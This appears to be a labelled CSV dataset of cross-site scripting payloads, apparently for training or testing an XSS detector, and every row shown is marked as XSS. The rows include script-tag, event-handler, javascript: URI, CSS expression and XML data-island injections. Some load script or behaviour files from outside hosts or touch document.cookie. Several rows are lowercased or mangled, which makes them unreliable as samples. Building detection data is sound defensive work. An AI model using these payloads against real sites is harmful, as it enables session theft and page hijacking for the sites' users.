payload,xss
confirm(2)>/,1
open()>,1
location=?javascript:alert(1)>click,1
<svg><script>alert(/1/)</script>,1
</script><script>alert(1)</script>,1
5rt(0);'>rhainfosec,1
">""<img src=&{document.cookie=true;};>",1
">""<img src=""mocha:document.cookie=true;"">",1
">""<img src=""livescript:document.cookie=true;"">",1
"""data:text/html;base64,phnjcmlwdd5hbgvydcgisgvsbg8ikts8l3njcmlwdd4="">",1
prompt(1);>,1
"<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(""crosssitescripting"")>",1
<iframe src=http://vulnerability-lab.com/index.html <,1
"<table background=""javascript:alert('crosssitescripting')"">",1
"<table><td background=""javascript:alert('crosssitescripting')"">",1
"<bgsound src=""javascript:alert('crosssitescripting');"">",1
"<br size=""&{alert('crosssitescripting')}"">",1
"<a href=""http://server.com/"">crosssitescripting</a>",1
"<a href=""http://www.google.com"">crosssitescripting</a>",1
"<a href=""http://1113982867/"">crosssitescripting</a>",1
"<a href=""javascript:document.location='http://www.vulnerability-lab.com/'"">crosssitescripting</a>",1
"<base href=""javascript:alert('crosssitescripting');//"">",1
""";alert('crosssitescripting');//",1
"<input type=""image"" src=""javascript:alert('crosssitescripting');"">",1
"<crosssitescripting style=""behavior: url(crosssitescripting.htc);"">",1
scriptalert(crosssitescripting)/script,1
"<img style=""crosssitescripting:expr/*crosssitescripting*/ession(alert('crosssitescripting'))"">",1
"<crosssitescripting style=""crosssitescripting:expression(alert('crosssitescripting'))""> exp/*<a style='no\\crosssitescripting:nocrosssitescripting(""*//*""); crosssitescripting:ex/*crosssitescripting*//*/*/pression(alert(""crosssitescripting""))'>",1
"<html xmlns:crosssitescripting><?import namespace=""crosssitescripting"" implementation=""http://ha.ckers.org/crosssitescripting.htc""><crosssitescripting:crosssitescripting>crosssitescripting</crosssitescripting:crosssitescripting>",1
"<xml id=i><x><c><![cdata[<img src=""javas]]><![cdata[cript:alert('crosssitescripting');"">]]>",1
</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>,1
"<xml id=""crosssitescripting""><i><b><img src=""javas<!-- -->cript:alert('crosssitescripting')""></b></i></xml>",1
"<span datasrc=""#crosssitescripting"" datafld=""b"" dataformatas=""html""></span>",1
"<xml src=""crosssitescriptingtest.xml"" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>",1
"<?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time"">",1
"<?import namespace=""t"" implementation=""#default#time2"">",1
"<t:set attributename=""innerhtml"" to=""crosssitescripting<script defer>alert(""crosssitescripting"")</script>"">",1
</body></html>,1
"<script src=""http://vulnerability-lab.com/crosssitescripting.jpg""></script>",1
"<? echo('<scr)';echo('ipt>alert(""crosssitescripting"")</script>'); ?>",1
"<img src=""http://www.vulnerability-lab.com/file.php?variables=malicious"">",1
<iframe src=http://test.de>,1
"<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(""xss"")>",1
><img id=xss src=x onerror=alert(xss);>,1
";!--""<xss>=&{()}""",1
"<img id=xss src=""javascript:alert('xss');"">",1
<img id=xss src=javascript:alert('xss')>,1
